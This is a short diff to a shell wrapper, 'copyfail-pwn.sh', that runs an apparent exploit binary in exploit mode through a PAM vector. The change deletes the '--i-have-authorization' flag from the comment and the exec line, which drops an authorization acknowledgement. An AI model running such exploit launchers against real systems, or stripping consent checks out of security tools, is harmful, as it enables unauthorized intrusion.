@@ -5,7 +5,7 @@
 # from a TTY — this wrapper exists for backwards compatibility with anything
 # that was calling the script directly. New users should just run the binary:
 #
-#     ./copyfail-rs --mode exploit --vector pam --i-have-authorization
+#     ./copyfail-rs --mode exploit
 #
 # Usage:
 #   ./copyfail-pwn.sh [path/to/copyfail-rs]
@@ -20,4 +20,4 @@ if [ ! -x "$BIN" ]; then
     exit 1
 fi
 
-exec "$BIN" --mode exploit --vector pam --i-have-authorization
+exec "$BIN" --mode exploit --vector pam
